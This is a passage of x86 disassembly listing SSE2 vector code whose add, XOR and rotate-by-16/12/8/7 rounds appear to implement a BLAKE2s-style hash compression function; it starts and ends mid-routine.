  403b55:	66 0f 6e 5c 24 24    	movd   0x24(%esp),%xmm3
  403b5b:	66 0f 6e f6          	movd   %esi,%xmm6
  403b5f:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403b63:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403b67:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403b6b:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403b6f:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403b73:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403b77:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403b7b:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403b80:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403b85:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403b89:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403b8d:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403b91:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403b95:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403b9a:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403b9f:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403ba3:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  403ba8:	66 0f 6e eb          	movd   %ebx,%xmm5
  403bac:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  403bb0:	66 0f 6e f3          	movd   %ebx,%xmm6
  403bb4:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  403bb8:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  403bbd:	66 0f 6e d8          	movd   %eax,%xmm3
  403bc1:	66 0f 6e fb          	movd   %ebx,%xmm7
  403bc5:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403bca:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403bce:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403bd2:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403bd6:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403bda:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403bde:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403be2:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403be6:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403bea:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403bef:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403bf4:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403bf8:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403bfc:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403c00:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403c04:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403c09:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403c0e:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403c12:	66 0f 6e db          	movd   %ebx,%xmm3
  403c16:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403c1a:	66 0f 6e fb          	movd   %ebx,%xmm7
  403c1e:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  403c22:	66 0f 6e ee          	movd   %esi,%xmm5
  403c26:	66 0f 6e f7          	movd   %edi,%xmm6
  403c2a:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403c2e:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403c32:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403c36:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403c3a:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403c3e:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403c42:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403c46:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403c4b:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403c50:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403c54:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403c58:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403c5c:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  403c61:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403c65:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403c6a:	66 0f 6e db          	movd   %ebx,%xmm3
  403c6e:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403c72:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403c77:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403c7b:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  403c80:	66 0f 6e eb          	movd   %ebx,%xmm5
  403c84:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403c88:	66 0f 6e f3          	movd   %ebx,%xmm6
  403c8c:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  403c90:	66 0f 6e fb          	movd   %ebx,%xmm7
  403c94:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403c98:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403c9d:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403ca1:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403ca5:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403ca9:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403cad:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403cb1:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403cb5:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403cb9:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403cbe:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403cc3:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403cc7:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403ccb:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403ccf:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403cd3:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403cd8:	66 0f 6e eb          	movd   %ebx,%xmm5
  403cdc:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  403ce0:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403ce5:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403ce9:	66 0f 6e da          	movd   %edx,%xmm3
  403ced:	66 0f 6e f1          	movd   %ecx,%xmm6
  403cf1:	66 0f 6e fb          	movd   %ebx,%xmm7
  403cf5:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403cf9:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403cfd:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403d01:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403d05:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403d09:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403d0d:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403d11:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403d16:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403d1b:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403d1f:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403d23:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403d27:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403d2b:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403d30:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403d35:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403d39:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  403d3e:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  403d42:	66 0f 6e db          	movd   %ebx,%xmm3
  403d46:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403d4a:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  403d4f:	66 0f 6e eb          	movd   %ebx,%xmm5
  403d53:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403d57:	66 0f 6e f3          	movd   %ebx,%xmm6
  403d5b:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403d5f:	66 0f 6e fb          	movd   %ebx,%xmm7
  403d63:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  403d67:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403d6c:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403d70:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403d74:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403d78:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403d7c:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403d80:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403d84:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403d88:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403d8d:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403d92:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403d96:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403d9a:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403d9e:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403da2:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403da7:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403dac:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403db0:	66 0f 6e db          	movd   %ebx,%xmm3
  403db4:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  403db8:	66 0f 6e eb          	movd   %ebx,%xmm5
  403dbc:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403dc0:	66 0f 6e f3          	movd   %ebx,%xmm6
  403dc4:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  403dc8:	66 0f 6e fb          	movd   %ebx,%xmm7
  403dcc:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403dd0:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403dd4:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403dd8:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403ddc:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403de0:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403de4:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403de8:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403dec:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403df1:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403df6:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403dfa:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403dfe:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403e02:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403e06:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403e0b:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  403e10:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403e15:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403e19:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  403e1e:	66 0f 6e ea          	movd   %edx,%xmm5
  403e22:	66 0f 6e f3          	movd   %ebx,%xmm6
  403e26:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403e2a:	66 0f 6e d8          	movd   %eax,%xmm3
  403e2e:	66 0f 6e fe          	movd   %esi,%xmm7
  403e32:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403e37:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403e3b:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403e3f:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403e43:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403e47:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403e4b:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403e4f:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403e53:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403e58:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403e5d:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403e61:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403e65:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403e69:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403e6d:	66 0f 6e ef          	movd   %edi,%xmm5
  403e71:	66 0f 6e f9          	movd   %ecx,%xmm7
  403e75:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403e7a:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403e7f:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403e83:	66 0f 6e db          	movd   %ebx,%xmm3
  403e87:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  403e8b:	66 0f 6e f3          	movd   %ebx,%xmm6
  403e8f:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403e93:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403e97:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403e9b:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403e9f:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403ea3:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403ea7:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403eab:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403eb0:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403eb5:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403eb9:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403ebd:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  403ec2:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403ec6:	66 0f 6e db          	movd   %ebx,%xmm3
  403eca:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403ece:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403ed2:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403ed7:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403edc:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403ee0:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  403ee5:	66 0f 6e f3          	movd   %ebx,%xmm6
  403ee9:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  403eed:	66 0f 6e fb          	movd   %ebx,%xmm7
  403ef1:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403ef5:	66 0f 6e ee          	movd   %esi,%xmm5
  403ef9:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403efe:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403f02:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403f06:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403f0a:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403f0e:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403f12:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403f16:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403f1a:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403f1f:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403f24:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403f28:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403f2c:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403f30:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403f34:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  403f39:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  403f3e:	66 0f ef cb          	pxor   %xmm3,%xmm1
  403f42:	66 0f 6e f3          	movd   %ebx,%xmm6
  403f46:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403f4a:	66 0f 6e d8          	movd   %eax,%xmm3
  403f4e:	66 0f 6e ea          	movd   %edx,%xmm5
  403f52:	66 0f 6e ff          	movd   %edi,%xmm7
  403f56:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403f5a:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403f5e:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403f62:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403f66:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403f6a:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403f6e:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403f72:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  403f77:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  403f7c:	66 0f ef d8          	pxor   %xmm0,%xmm3
  403f80:	66 0f fe d3          	paddd  %xmm3,%xmm2
  403f84:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  403f89:	66 0f 6e db          	movd   %ebx,%xmm3
  403f8d:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  403f91:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403f95:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  403f99:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  403f9e:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  403fa3:	66 0f ef e9          	pxor   %xmm1,%xmm5
  403fa7:	66 0f 6e f3          	movd   %ebx,%xmm6
  403fab:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  403faf:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  403fb4:	66 0f 6e e9          	movd   %ecx,%xmm5
  403fb8:	66 0f 6e fb          	movd   %ebx,%xmm7
  403fbc:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  403fc1:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  403fc5:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  403fc9:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  403fcd:	66 0f fe e7          	paddd  %xmm7,%xmm4
  403fd1:	66 0f fe e1          	paddd  %xmm1,%xmm4
  403fd5:	66 0f ef c4          	pxor   %xmm4,%xmm0
  403fd9:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  403fdd:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  403fe2:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  403fe7:	66 0f ef c3          	pxor   %xmm3,%xmm0
  403feb:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403fef:	66 0f fe d0          	paddd  %xmm0,%xmm2
  403ff3:	66 0f ef ca          	pxor   %xmm2,%xmm1
  403ff7:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  403ffb:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404000:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  404005:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404009:	66 0f 6e db          	movd   %ebx,%xmm3
  40400d:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  404011:	66 0f 6e eb          	movd   %ebx,%xmm5
  404015:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404019:	66 0f 6e f3          	movd   %ebx,%xmm6
  40401d:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404021:	66 0f 6e fb          	movd   %ebx,%xmm7
  404025:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  404029:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  40402d:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404031:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  404035:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404039:	66 0f fe e1          	paddd  %xmm1,%xmm4
  40403d:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404041:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  404045:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  40404a:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  40404f:	66 0f ef d8          	pxor   %xmm0,%xmm3
  404053:	66 0f fe d3          	paddd  %xmm3,%xmm2
  404057:	66 0f ef ca          	pxor   %xmm2,%xmm1
  40405b:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  40405f:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  404064:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  404069:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  40406e:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404072:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  404077:	66 0f 6e db          	movd   %ebx,%xmm3
  40407b:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40407f:	66 0f 6e ef          	movd   %edi,%xmm5
  404083:	66 0f 6e f1          	movd   %ecx,%xmm6
  404087:	66 0f 6e fe          	movd   %esi,%xmm7
  40408b:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  404090:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404094:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404098:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40409c:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4040a0:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4040a4:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4040a8:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4040ac:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  4040b1:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  4040b6:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4040ba:	66 0f fe d0          	paddd  %xmm0,%xmm2
  4040be:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4040c2:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  4040c6:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  4040cb:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  4040d0:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4040d4:	66 0f 6e db          	movd   %ebx,%xmm3
  4040d8:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4040dc:	66 0f 6e eb          	movd   %ebx,%xmm5
  4040e0:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  4040e4:	66 0f 6e f3          	movd   %ebx,%xmm6
  4040e8:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4040ec:	66 0f 6e fb          	movd   %ebx,%xmm7
  4040f0:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4040f4:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4040f8:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4040fc:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404100:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404104:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404108:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40410c:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  404111:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  404116:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40411a:	66 0f fe d3          	paddd  %xmm3,%xmm2
  40411e:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404122:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  404126:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  40412b:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  404130:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404134:	66 0f 70 c3 93       	pshufd $0x93,%xmm3,%xmm0
  404139:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  40413e:	66 0f 70 cd 39       	pshufd $0x39,%xmm5,%xmm1
  404143:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404147:	66 0f 6e db          	movd   %ebx,%xmm3
  40414b:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40414f:	66 0f 6e f3          	movd   %ebx,%xmm6
  404153:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  404157:	66 0f 6e e8          	movd   %eax,%xmm5
  40415b:	66 0f 6e fa          	movd   %edx,%xmm7
  40415f:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404163:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404167:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40416b:	66 0f fe e7          	paddd  %xmm7,%xmm4
  40416f:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404173:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404177:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40417b:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  404180:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  404185:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404189:	66 0f fe d0          	paddd  %xmm0,%xmm2
  40418d:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404191:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404195:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  40419a:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  40419f:	66 0f ef cb          	pxor   %xmm3,%xmm1
  4041a3:	66 0f 6e db          	movd   %ebx,%xmm3
  4041a7:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4041ab:	66 0f 6e eb          	movd   %ebx,%xmm5
  4041af:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4041b3:	66 0f 6e f3          	movd   %ebx,%xmm6
  4041b7:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4041bb:	66 0f 6e fb          	movd   %ebx,%xmm7
  4041bf:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4041c3:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  4041c7:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  4041cb:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  4041cf:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4041d3:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4041d7:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4041db:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4041df:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  4041e4:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  4041e9:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4041ed:	66 0f fe d3          	paddd  %xmm3,%xmm2
  4041f1:	66 0f ef ca          	pxor   %xmm2,%xmm1
  4041f5:	66 0f 6f e9          	movdqa %xmm1,%xmm5
  4041f9:	66 0f 72 f1 19       	pslld  $0x19,%xmm1
  4041fe:	66 0f 72 d5 07       	psrld  $0x7,%xmm5
  404203:	66 0f ef e9          	pxor   %xmm1,%xmm5
  404207:	66 0f 70 cd 93       	pshufd $0x93,%xmm5,%xmm1
  40420c:	66 0f 6e eb          	movd   %ebx,%xmm5
  404210:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404214:	66 0f 70 c3 39       	pshufd $0x39,%xmm3,%xmm0
  404219:	66 0f 6e f3          	movd   %ebx,%xmm6
  40421d:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404221:	66 0f 6e fb          	movd   %ebx,%xmm7
  404225:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  404229:	66 0f 6e da          	movd   %edx,%xmm3
  40422d:	66 0f 70 d2 4e       	pshufd $0x4e,%xmm2,%xmm2
  404232:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404236:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  40423a:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40423e:	66 0f fe e7          	paddd  %xmm7,%xmm4
  404242:	66 0f fe e1          	paddd  %xmm1,%xmm4
  404246:	66 0f ef c4          	pxor   %xmm4,%xmm0
  40424a:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  40424e:	66 0f 72 f3 10       	pslld  $0x10,%xmm3
  404253:	66 0f 72 d0 10       	psrld  $0x10,%xmm0
  404258:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40425c:	66 0f fe d0          	paddd  %xmm0,%xmm2
  404260:	66 0f ef ca          	pxor   %xmm2,%xmm1
  404264:	66 0f 6f d9          	movdqa %xmm1,%xmm3
  404268:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  40426d:	66 0f 72 d1 0c       	psrld  $0xc,%xmm1
  404272:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404276:	66 0f 6e db          	movd   %ebx,%xmm3
  40427a:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40427e:	66 0f 6e eb          	movd   %ebx,%xmm5
  404282:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404286:	66 0f 6e f0          	movd   %eax,%xmm6
  40428a:	66 0f 6e fb          	movd   %ebx,%xmm7
  40428e:	66 0f 62 f3          	punpckldq %xmm3,%xmm6
  404292:	66 0f 62 fd          	punpckldq %xmm5,%xmm7
  404296:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40429a:	66 0f 62 fe          	punpckldq %xmm6,%xmm7
  40429e:	66 0f fe e7          	paddd  %xmm7,%xmm4
  4042a2:	66 0f fe e1          	paddd  %xmm1,%xmm4
  4042a6:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4042aa:	66 0f 6f d8          	movdqa %xmm0,%xmm3
  4042ae:	66 0f 72 d3 08       	psrld  $0x8,%xmm3
  4042b3:	66 0f 72 f0 18       	pslld  $0x18,%xmm0
  4042b8:	66 0f ef d8          	pxor   %xmm0,%xmm3
